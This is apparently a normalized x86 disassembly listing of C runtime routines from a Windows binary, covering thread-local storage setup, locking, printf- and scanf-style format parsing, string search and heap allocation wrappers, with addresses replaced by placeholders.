add esp 0x1c
test eax eax
jne r-xdata
sub_4063b0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_4063e4
push esi
call sub_408a46
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
xor eax eax
pop esi
retn
push 0x74
push 0x1
call sub_4089b9
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_406438
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
push 0x1
mov [ esi ] eax
pop eax
pop esi
retn
sub_40644b
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
mov eax esi
pop edi
pop esi
retn
push 0x74
push 0x1
call sub_4089b9
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push 0x10
call sub_4062ea
pop ecx
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_406438
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_4064b2
push ebp
mov ebp esp
sub esp 0x24
push ebx
mov ebx [ ebp + 0x8 ]
sub ebx 0x76c
cmp ebx 0x46
jl r-xdata
or eax 0xffffffff
cmp ebx 0x8a
jg r-xdata
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ edi * 4 + rw-data ]
add esi [ ebp + 0x10 ]
test bl 0x3
jne r-xdata
call sub_408ae5
mov eax ebx
lea ecx [ ebx - 0x1 ]
imul eax eax 0x16d
sar ecx 0x2
mov edx esi
mov [ ebp - 0x8 ] esi
add edx ecx
mov [ ebp - 0x10 ] ebx
add eax edx
mov edx [ ebp + 0x1c ]
lea ecx [ eax + eax * 2 ]
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x1c ] eax
lea ecx [ eax + ecx * 8 ]
imul ecx ecx 0x3c
add ecx [ ebp + 0x18 ]
imul ecx ecx 0x3c
add ecx [ rw-data ]
dec edi
cmp [ ebp + 0x20 ] 0x1
mov [ ebp - 0x14 ] edi
pop edi
pop esi
lea ecx [ ecx + edx + 0x7c558180 ]
mov [ ebp + 0x8 ] ecx
je r-xdata
cmp edi 0x2
jle r-xdata
add ecx [ rw-data ]
cmp [ ebp + 0x20 ] 0xffffffff
jne r-xdata
inc esi
pop ebx
leave
retn
mov eax ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_408d9a
pop ecx
mov ecx [ ebp + 0x8 ]
test eax eax
je r-xdata
sub_406574
mov eax [ rw-data ]
push esi
push 0x14
test eax eax
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_4089b9
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor ecx ecx
mov eax rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_4089b9
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov edx [ rw-data ]
mov [ ecx + edx ] eax
add eax 0x20
add ecx 0x4
cmp eax rw-data
jl r-xdata
xor ecx ecx
mov edx rw-data
push 0x1a
call sub_4062ea
pop ecx
or [ edx ] 0xffffffff
test eax eax
jne r-xdata
mov esi ecx
mov eax ecx
sar esi 0x5
and eax 0x1f
mov esi [ esi * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
mov eax [ esi + eax * 4 ]
cmp eax 0xffffffff
je r-xdata
pop esi
retn
add edx 0x20
inc ecx
cmp edx rw-data
jl r-xdata
sub_406630
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_408a6f
pop ecx
retn
sub_40665f
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_408a6f
pop ecx
retn
sub_406682
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_408ad0
pop ecx
retn
sub_4066b1
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_408ad0
pop ecx
retn
sub_4066d4
push esi
mov esi [ esp + 0x8 ]
push [ esi + 0x10 ]
call sub_40925f
test eax eax
pop ecx
je r-xdata
xor eax eax
pop esi
retn
cmp esi rw-data
jne r-xdata
cmp esi rw-data
jne r-xdata
xor eax eax
jmp r-xdata
push 0x1
pop eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
cmp [ eax * 4 + rw-data ] 0x0
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x18 ] ebx
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x4 ] ebx
push ebx
call sub_4070b4
test eax eax
pop ecx
mov [ edi ] eax
jne r-xdata
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
push 0x1
pop eax
pop edi
pop ebx
pop esi
retn
sub_406761
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
pop esi
retn
mov esi [ esp + 0xc ]
test [ esi + 0xd ] 0x10
je r-xdata
push esi
call sub_409156
and [ esi + 0xd ] 0xee
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_40678b
push ebp
mov ebp esp
sub esp 0x248
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
xor esi esi
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp + 0xc ] edi
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
xor edx edx
jmp r-xdata
cmp [ ebp - 0x14 ] edx
jl r-xdata
cmp bl 0x20
jl r-xdata
xor eax eax
cmp bl 0x78
jg r-xdata
mov edi [ ebp + 0xc ]
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp + 0xc ] edi
jne r-xdata
jmp [ eax * 4 + jump_table_406eac ]
movsx eax bl
mov al [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x30 ]
xor edx edx
or [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x24 ] edx
jmp r-xdata
movsx eax bl
sub eax 0x20
je r-xdata
cmp bl 0x2a
jne r-xdata
mov [ ebp - 0x10 ] edx
jmp r-xdata
cmp bl 0x2a
jne r-xdata
cmp bl 0x49
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] edx
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
movsx eax bl
cmp eax 0x67
jg r-xdata
movsx eax [ esi + eax * 8 + r--data ]
sar eax 0x4
cmp eax 0x7
mov [ ebp - 0x30 ] eax
ja r-xdata
or [ ebp - 0x4 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x20 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_406f6a
test eax eax
pop ecx
mov [ ebp - 0x20 ] eax
jge r-xdata
lea eax [ ecx + ecx * 4 ]
movsx ecx bl
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_406f6a
test eax eax
pop ecx
mov [ ebp - 0x10 ] eax
jge r-xdata
cmp [ edi ] 0x36
jne r-xdata
cmp bl 0x68
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_406ecc
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_406ecc
mov bl [ edi ]
add esp 0xc
inc edi
mov [ ebp + 0xc ] edi
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x4 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x10 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x30 ] edx
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x4 ] 0x20
jmp r-xdata
cmp bl 0x6c
je r-xdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x4 ] 0x40
lea edi [ ebp - 0x248 ]
cmp ecx edx
mov [ ebp - 0x8 ] edi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x4 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
inc edi
inc edi
or [ ebp - 0x3 ] 0x80
mov [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp - 0x4 ] 0x10
jmp r-xdata
cmp bl 0x77
jne r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_406f77
pop ecx
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_406f6a
test [ ebp - 0x4 ] 0x20
pop ecx
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0x10 ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ebp - 0x3 ] 0x8
jmp r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x8
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x34 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
push [ ebp - 0x10 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x48 ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x44 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x248 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call [ rw-data ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je r-xdata
cmp bl 0x67
jne r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_406f6a
test eax eax
pop ecx
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x2c ] 0x7
sub eax 0x43
je r-xdata
or [ ebp - 0x4 ] 0x8
jmp r-xdata
call sub_406f6a
pop ecx
xor edx edx
call sub_406f6a
pop ecx
jmp r-xdata
call sub_406f6a
pop ecx
movzx eax ax
jmp r-xdata
call sub_406f6a
pop ecx
movsx eax ax
mov esi eax
mov edi edx
test edx edx
jg r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x80
je r-xdata
or [ ebp - 0x3 ] 0x2
jmp r-xdata
mov [ ebp - 0x10 ] 0x8
sub eax 0x3
je r-xdata
cmp bl 0x67
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
push eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
test [ ebp - 0x4 ] 0x810
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
dec eax
je r-xdata
mov al [ ebp - 0x2c ]
mov [ ebp - 0x16 ] 0x30
add al 0x51
mov [ ebp - 0x1c ] 0x2
mov [ ebp - 0x15 ] al
jmp r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cdq
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
and edi 0x0
jl r-xdata
mov esi [ ebp - 0x10 ]
cmp esi 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp - 0x248 ] 0x2d
jne r-xdata
test esi esi
jne r-xdata
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
call sub_405b40
pop ecx
jmp r-xdata
test [ ebp - 0x3 ] 0x8
je r-xdata
call sub_406f6a
pop ecx
mov [ ebp - 0x248 ] al
mov [ ebp - 0xc ] 0x1
call sub_406f87
push eax
lea eax [ ebp - 0x248 ]
push eax
call sub_409288
add esp 0xc
mov [ ebp - 0xc ] eax
test eax eax
jge r-xdata
jmp r-xdata
or [ ebp - 0x3 ] 0x8
mov [ ebp - 0x34 ] 0x1
add bl 0x20
dec eax
dec eax
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
mov esi eax
neg edx
or [ ebp - 0x3 ] 0x1
mov edi edx
jmp r-xdata
test eax eax
jae r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_406f6a
test [ ebp - 0x4 ] 0x810
pop ecx
mov ecx eax
mov [ ebp - 0x8 ] ecx
je r-xdata
mov esi 0x7fffffff
mov [ ebp - 0xc ] 0xa
sub eax 0x3
jne r-xdata
push edi
or [ ebp - 0x3 ] 0x1
lea edi [ ebp - 0x247 ]
mov [ ebp - 0x8 ] edi
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
mov [ ebp - 0xc ] eax
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x8 ] ecx
movsx eax [ eax ]
jmp r-xdata
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x24 ] 0x1
jmp r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
lea eax [ ebp - 0x248 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
sub eax 0xc
jne r-xdata
lea eax [ ebp - 0x49 ]
mov [ ebp - 0x8 ] eax
and [ ebp - 0x1c ] 0x0
mov eax esi
or eax edi
jne r-xdata
test [ ebp - 0x3 ] 0x80
jne r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov [ ebp - 0x2c ] 0x27
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
push edi
push esi
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] edx
call sub_4093c0
push [ ebp - 0x3c ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x40 ]
push edi
push esi
call sub_409350
cmp ebx 0x39
mov esi eax
mov edi edx
jle r-xdata
mov eax esi
or eax edi
je r-xdata
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x24 ] 0x1
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x10
je r-xdata
mov esi [ ebp - 0x20 ]
sub esi [ ebp - 0x1c ]
sub esi [ ebp - 0xc ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
or [ ebp - 0x3 ] 0x8
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
mov [ eax ] bl
jmp r-xdata
add ebx [ ebp - 0x2c ]
lea eax [ ebp - 0x49 ]
sub eax [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0xc ] eax
je r-xdata
sub eax ecx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
sub eax ecx
sar eax 0x1
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x16 ]
push [ ebp + 0x8 ]
push [ ebp - 0x1c ]
push eax
call sub_406f32
add esp 0x10
test bl 0x8
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_406f01
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x16 ] 0x2d
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
test eax eax
jg r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx ] 0x30
jne r-xdata
inc eax
jmp r-xdata
inc eax
inc eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x16 ] 0x2b
jmp r-xdata
mov [ ebp - 0x1c ] 0x1
dec [ ebp - 0x8 ]
inc eax
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0x30
test eax eax
jne r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
call sub_406f32
add esp 0x10
cmp [ ebp - 0xc ] 0x0
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_406f01
add esp 0x10
mov [ ebp - 0x16 ] 0x20
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_406f01
add esp 0x10
mov eax [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
lea edi [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call sub_406f32
add esp 0x10
mov eax edi
dec edi
test eax eax
jne r-xdata
mov ax [ ebx ]
inc ebx
push eax
lea eax [ ebp - 0x38 ]
push eax
inc ebx
call sub_409288
pop ecx
test eax eax
pop ecx
jle r-xdata
jmp r-xdata
sub_406ecc
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
dec [ ecx + 0x4 ]
js r-xdata
push ecx
push [ ebp + 0x8 ]
call sub_409435
pop ecx
pop ecx
mov edx [ ecx ]
mov al [ ebp + 0x8 ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ eax ]
pop ebp
retn
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
mov eax [ ebp + 0x10 ]
jne r-xdata
sub_406f01
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg r-xdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_406ecc
add esp 0xc
cmp [ esi ] 0xffffffff
je r-xdata
sub_406f32
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg r-xdata
movsx eax [ esi ]
push edi
inc esi
push [ esp + 0x1c ]
push eax
call sub_406ecc
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_406fb0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_40706c
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push 0x9
call sub_408a6f
push esi
call sub_40958b
pop ecx
test eax eax
pop ecx
je r-xdata
push 0x9
call sub_408ad0
pop ecx
push esi
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
push esi
push eax
call sub_4095b6
push 0x9
call sub_408ad0
add esp 0xc
pop esi
retn
sub_4070c6
cmp [ esp + 0x4 ] 0xffffffe0
ja r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_4070f2
test eax eax
pop ecx
jne r-xdata
retn
cmp [ esp + 0x8 ] eax
je r-xdata
push [ esp + 0x4 ]
call sub_40a08c
test eax eax
pop ecx
jne r-xdata
sub_4070f2
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
push edi
ja r-xdata
test esi esi
jne r-xdata
push 0x9
call sub_408a6f
push esi
call sub_4098e1
push 0x9
mov edi eax
call sub_408ad0
add esp 0xc
test edi edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
push 0x1
pop esi
mov eax edi
jmp r-xdata
pop edi
pop esi
retn
sub_407140
push ebp
mov ebp esp
sub esp 0x1c4
and [ ebp - 0x15 ] 0x0
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov al [ esi ]
mov [ ebp - 0x4 ] ebx
test al al
mov [ ebp - 0x34 ] ebx
je r-xdata
cmp [ ebp - 0x14 ] 0xffffffff
jne r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov eax [ ebp - 0x34 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x15 ] al
jne r-xdata
mov ecx [ rw-data ]
movzx eax al
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax al
push 0x8
push eax
call sub_406333
pop ecx
pop ecx
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ esi ] 0x25
jne r-xdata
dec [ ebp - 0x4 ]
push edi
lea eax [ ebp - 0x4 ]
push edi
push eax
call sub_407bcd
pop ecx
pop ecx
push eax
call sub_407bb6
movzx eax [ esi + 0x1 ]
inc esi
push eax
call sub_40a1cd
add esp 0xc
cmp eax ebx
je r-xdata
inc [ ebp - 0x4 ]
push edi
call sub_407b9c
mov ebx eax
pop ecx
movzx eax [ esi ]
inc esi
cmp eax ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp + 0xc ] esi
jne r-xdata
and [ ebp - 0x35 ] 0x0
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x17 ] 0x0
and [ ebp - 0xe ] 0x0
and [ ebp - 0xf ] 0x0
and [ ebp - 0x16 ] 0x0
xor edi edi
and [ ebp - 0x5 ] 0x0
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0xd ] 0x1
mov [ ebp - 0x30 ] ebx
movzx eax [ esi + 0x1 ]
inc esi
push eax
call sub_40a1cd
pop ecx
jmp r-xdata
dec [ ebp - 0x4 ]
push edi
push ebx
mov ecx [ rw-data ]
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x4
movzx eax bl
push 0x4
push eax
call sub_406333
pop ecx
pop ecx
jmp r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x14 ] 0xffffffff
jne r-xdata
inc [ ebp - 0x4 ]
push edi
call sub_407b9c
pop ecx
movzx ecx [ esi ]
inc esi
cmp ecx eax
mov [ ebp + 0xc ] esi
jne r-xdata
cmp ebx 0x4e
jg r-xdata
mov eax [ ebp - 0xc ]
inc [ ebp - 0x20 ]
lea eax [ eax + eax * 4 ]
lea eax [ ebx + eax * 2 - 0x30 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
test eax eax
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
cmp [ esi ] 0x25
jne r-xdata
dec [ ebp - 0x4 ]
push edi
push eax
call sub_407bb6
dec [ ebp - 0x4 ]
push edi
push ebx
call sub_407bb6
add esp 0x10
dec [ ebp - 0x4 ]
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0xf ] 0x0
je r-xdata
mov edi [ ebp + 0x8 ]
xor ebx ebx
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1 ] 0x6e
jne r-xdata
dec [ ebp - 0xd ]
dec [ ebp - 0x5 ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
movzx ebx [ esi + 0x1 ]
inc esi
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ ebp - 0xe ] 0x0
mov [ ebp + 0xc ] esi
jne r-xdata
mov esi eax
inc [ ebp - 0xd ]
cmp ebx 0x77
je r-xdata
inc [ ebp - 0xe ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
and [ ebp - 0xf ] 0x0
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x44 ] eax
add eax 0x4
mov [ ebp + 0x10 ] eax
mov eax [ eax - 0x4 ]
mov [ ebp - 0x2c ] eax
inc [ ebp - 0x5 ]
jmp r-xdata
inc [ ebp - 0xf ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
mov ebx [ ebp + 0xc ]
movzx esi [ ebx ]
or esi 0x20
cmp esi 0x6e
mov [ ebp - 0x3c ] esi
je r-xdata
mov al [ esi ]
cmp al 0x53
je r-xdata
cmp [ esi + 0x1 ] 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
xor eax eax
cmp [ ebp - 0x20 ] eax
je r-xdata
cmp esi 0x63
je r-xdata
mov [ ebp - 0x5 ] 0x1
cmp al 0x43
je r-xdata
cmp [ esi + 0x2 ] 0x34
lea eax [ esi + 0x2 ]
jne r-xdata
inc [ ebp - 0xd ]
jmp r-xdata
cmp esi 0x6f
jg r-xdata
cmp [ ebp - 0xc ] eax
je r-xdata
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_407b9c
cmp esi 0x7b
je r-xdata
or [ ebp - 0x5 ] 0xff
jmp r-xdata
inc [ ebp - 0x30 ]
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x24 ] 0x0
mov esi eax
jmp r-xdata
mov eax esi
sub eax 0x70
je r-xdata
je r-xdata
push [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
push [ ebp - 0x14 ]
jmp r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_407bcd
pop ecx
jmp r-xdata
mov [ ebp - 0xd ] 0x1
sub eax 0x3
je r-xdata
mov ebx [ ebp - 0x14 ]
cmp ebx 0x2d
jne r-xdata
cmp esi 0x63
je r-xdata
call sub_407bb6
pop ecx
pop ecx
jmp r-xdata
pop ecx
mov [ ebp - 0x14 ] eax
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x17 ] 0x1
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
cmp esi 0x64
je r-xdata
